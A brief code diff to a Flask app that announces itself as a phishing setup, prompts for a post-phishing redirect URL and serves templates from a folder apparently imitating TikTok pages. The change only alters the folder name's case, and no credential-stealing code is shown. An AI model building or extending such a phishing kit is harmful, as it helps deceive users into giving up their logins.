@@ -4,7 +4,7 @@ from flask import Flask, render_template, request, redirect, url_for
 print('Setting up phishing...')
 action_url = input('Enter the URL to redirect users after phishing: ')
 
-app = Flask(__name__, template_folder='Phishing/templates/tiktok')
+app = Flask(__name__, template_folder='Phishing/templates/TIKTok')
 username = None
 
 @app.route("/")
